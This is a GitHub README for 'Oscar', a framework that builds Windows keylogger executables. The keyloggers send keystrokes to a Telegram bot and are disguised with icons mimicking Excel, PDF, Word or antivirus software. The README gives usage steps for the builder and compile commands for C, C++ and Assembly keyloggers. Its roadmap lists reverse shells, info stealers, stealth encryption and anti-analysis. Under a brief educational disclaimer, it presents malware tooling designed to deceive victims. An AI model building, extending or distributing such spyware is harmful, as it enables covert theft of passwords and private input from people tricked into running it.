<p align="center">
  <img src="https://i.imgur.com/uAcYBFj.gif" width="850">
</p>

<h1 align="center">🎯 Oscar</h1>

<p align="center">
  <b>Modular Payload Generation Framework</b>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/status-Under%20Development-yellow?style=for-the-badge">
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/language-C%20%7C%20C++%20%7C%20Assembly-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/origin-2022-darkred?style=for-the-badge">
</p>

<p align="center">
  <i>"There's chaos in you."</i>
</p>

---

# ⚠️ Disclaimer

This repository exists strictly for:
- educational purposes
- malware analysis research
- authorized security testing

Unauthorized monitoring, logging, or access to systems you do not own or have explicit permission to test is illegal and unethical.

The author assumes no responsibility for misuse or damages caused by this project.

---

# 📌 What is Oscar?

**Oscar** is a payload generation framework that started in 2022 as a simple Windows keylogger builder. The project was originally built during a time when AI assistants weren't writing code, auto-completing architecture, or explaining bugs in seconds. Everything here was built through trial and error, documentation digging, broken builds, random Stack Overflow threads, and long nights staring at terminal windows.

**Python is only the interface layer** — the actual payloads are written in C, C++, and Assembly for better performance, lower overhead, and more control over system resources.

### The Original Vision
The original version worked like this:
- User runs `Oscar.py`
- Enters payload name, Bot Token, and Chat ID
- Selects a deceptive icon (Excel, PDF, Word, VLC, etc.)
- Oscar automatically generates a `.exe` file
- No commands, no manual compilation — just simple prompts

### The New Vision
Oscar is now being rewritten and expanded to become a **modular framework** that supports:
- **Multiple payloads**: Keylogger, Reverse Shell, Info Stealer, and more
- **Multiple languages**: C, C++, Assembly, Python, Bash, and any language users want to add
- **Multiple platforms**: Windows, Linux, macOS
- **Custom payload addition**: Users can add their own payloads easily

---

# 🚧 Current Status

> Oscar is currently under active development. The original builder still works, while the new modular system is being built.

| Component | Status | Description |
|-----------|--------|-------------|
| Original Builder (Oscar.py) | ✅ Working | The classic interface that started it all |
| Windows Keylogger (C++) | ✅ Complete | High-performance keylogger with Telegram support |
| Windows Keylogger (C) | ✅ Complete | Lightweight C implementation |
| Windows Keylogger (Assembly) | ✅ Complete | Low-level implementation for maximum control |
| Linux Support | 🚧 Planned | Expanding beyond Windows |
| Reverse Shell Payload | 🚧 Planned | Cross-platform reverse shell |
| Modular Builder | 🚧 In Progress | New architecture for multiple payloads |
| Custom Payload Support | 📝 Planned | Users add their own payloads |

---

# 📁 Project Structure

```
Oscar/
│
├── Oscar.py                         # Python interface (original builder - working)
│
├── Payloads/                        # All payloads organized by platform
│   ├── windows/
│   │   ├── keylogger/               # Windows Keylogger
│   │   │   ├── Assembly/
│   │   │   │   └── keylog.asm       # Assembly implementation
│   │   │   ├── C/
│   │   │   │   └── keylog.c         # C implementation
│   │   │   └── C++/
│   │   │       └── keylog.cpp       # C++ implementation
│   │   └── reverse_shell/           # Coming soon
│   ├── linux/
│   │   └── reverse_shell/           # Coming soon
│   └── mac-os/
│       └── todo/                    # Coming soon
│
├── icon/                            # Deceptive icons for Windows
│   ├── excel.ico
│   ├── pdf.ico
│   ├── word.ico
│   ├── vlc.ico
│   ├── powerpoint.ico
│   ├── Counter-Strike.ico
│   ├── Adobe-After-Effects.ico
│   ├── Adobe-Photoshop.ico
│   └── Anti-Virus.ico
│
├── modules/                         # Helper modules
│   ├── banner.py
│   └── gnt.py
│
├── builder/                         # New modular builder (in progress)
│   └── payload_selector.py
│
├── config/                          # Payload registry (in progress)
│   └── payloads_config.json
│
├── requirements.txt
└── README.md
```

---

# 💻 Currently Supported Languages

These are the languages we currently provide implementations for. In the future, the framework will support **any language** that users want to add.

| Language | Keylogger | Reverse Shell | Notes |
|----------|-----------|---------------|-------|
| **C** | ✅ Complete | 🚧 Planned | Lightweight, fast, minimal dependencies |
| **C++** | ✅ Complete | 🚧 Planned | Object-oriented, feature-rich |
| **Assembly** | ✅ Complete | 📝 Planned | Maximum control, smallest binary size |
| **Python** | 📝 Planned | 📝 Planned | Easy to modify and extend |
| **Bash** | ❌ N/A | 📝 Planned | For Linux environments |
| **Any Language** | 💡 Future | 💡 Future | Users can add their own |

---

# 🔧 How to Use (Original Builder)

## Requirements

| Dependency | Purpose |
|------------|---------|
| Python 3.8+ | Interface layer |
| MinGW (g++) | Compiling C++ payloads |
| libcurl | HTTP requests for Telegram |

## Installation

```
git clone https://github.com/Arash-abraham/Oscar.git
cd Oscar
pip install -r requirements.txt
```

## Run the Builder

```
python Oscar.py
```

You will be prompted to:
1. Enter a name for your payload (e.g., "Oscar")
2. Enter your Telegram Bot Token (from @BotFather)
3. Enter your Chat ID (from @userinfobot)
4. Select an icon from the list:
   - Excel, PDF, Word, VLC
   - PowerPoint, Counter-Strike
   - Adobe After Effects, Adobe Photoshop
   - Anti-Virus

**Output:** `dist/<payload_name>.exe`

---

# 🛠️ Manual Build (Current Payloads)

If you prefer to build manually or want to customize the code:

## C++ Keylogger

```
cd Payloads/windows/keylogger/C++
g++ -o keylogger.exe keylog.cpp -lcurl -lws2_32 -lwinhttp -lcrypt32 -luser32 -ladvapi32 -O2 -mwindows
```

## C Keylogger

```
cd Payloads/windows/keylogger/C
gcc -o keylogger.exe keylog.c -lcurl -lws2_32 -lwinhttp -lcrypt32 -luser32 -ladvapi32 -O2 -mwindows -std=c99
```

## Assembly Keylogger (NASM)

```
cd Payloads/windows/keylogger/Assembly
nasm -f win32 keylog.asm -o keylog.obj
gcc -o keylogger.exe keylog.obj -lkernel32 -luser32 -lws2_32
```

## Assembly Keylogger (MASM)

```
cd Payloads/windows/keylogger/Assembly
ml /c /coff /Cp keylog.asm
link /SUBSYSTEM:WINDOWS /OUT:keylogger.exe keylog.obj
```

---

# 🗺️ Roadmap

| Feature | Status | Description |
|---------|--------|-------------|
| Modular Builder | 🚧 In Progress | Replace old builder with modular system |
| Payload Selection | 🚧 In Progress | Choose between keylogger, reverse shell, etc. |
| Linux Support | 📝 Planned | Linux payloads (reverse shell, keylogger) |
| macOS Support | 📝 Planned | macOS payloads |
| Python Payloads | 📝 Planned | Python versions of all payloads |
| Custom Payload Addition | 📝 Planned | Users add their own payloads in any language |
| Payload Encryption | 💡 Idea | Encrypt payloads for stealth |
| Anti-Debugging | 💡 Idea | Anti-debugging and anti-analysis techniques |

---

# 🎯 Why "Oscar"?

When development first started, the *Moon Knight* series had just released. Oscar Isaac was everywhere. The name stuck. No deeper meaning than that. Just nostalgia from a different era of coding.

---

# 📧 Contact

📧 arashebi777@gmail.com

---

<p align="center">
  <i>Hack responsibly.</i>
</p>